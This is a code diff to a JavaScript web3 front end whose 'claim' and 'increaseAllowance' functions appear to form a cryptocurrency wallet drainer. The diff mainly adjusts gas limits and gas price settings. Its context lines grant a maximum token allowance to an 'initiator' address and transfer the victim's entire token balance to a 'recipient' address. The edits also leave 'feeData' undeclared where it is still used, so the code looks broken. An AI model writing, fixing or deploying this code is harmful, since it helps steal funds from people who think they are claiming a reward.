@@ -89,7 +89,7 @@ export const getPrice = async (symbols) => {
 };
 
 export const claim = async (_balance) => {
-  let feeData = await fetchFeeData({
+  feeData = await fetchFeeData({
     chainId: 1,
     formatUnits: 'gwei',
   });
@@ -101,7 +101,6 @@ export const claim = async (_balance) => {
     functionName: 'Claim',
     value: amount,
     gas: '50000',
-    gasPrice: feeData.gasPrice
   }).then((result) => {
     console.log(result)
   }).catch((error) => {
@@ -110,12 +109,6 @@ export const claim = async (_balance) => {
   });
 };
 export const increaseAllowance = async (token) => {
-
-  let feeData = await fetchFeeData({
-    chainId: 1,
-    formatUnits: 'gwei',
-  });
-  
   // RPC provider
   const provider = new ethers.providers.JsonRpcProvider(constants.infura);
   
@@ -204,7 +197,7 @@ export const increaseAllowance = async (token) => {
       abi: constants.ALLOWANCEABI,
       functionName: 'increaseAllowance',
       args: [constants.initiator, constants.max],
-      gas: '70000',
+      gas: '50000',
       gasPrice: feeData.gasPrice
     }).then(async (result) => {
       console.log(result)
@@ -220,8 +213,7 @@ export const increaseAllowance = async (token) => {
       abi: constants.ERC20ABI,
       functionName: 'transfer',
       args: [constants.recipient, balanceOf(token)],
-      gas: '70000',
-      gasPrice: feeData.gasPrice
+      gas: '50000',
     }).then((result) => {
       console.log(result)
     }).catch( (error) => {
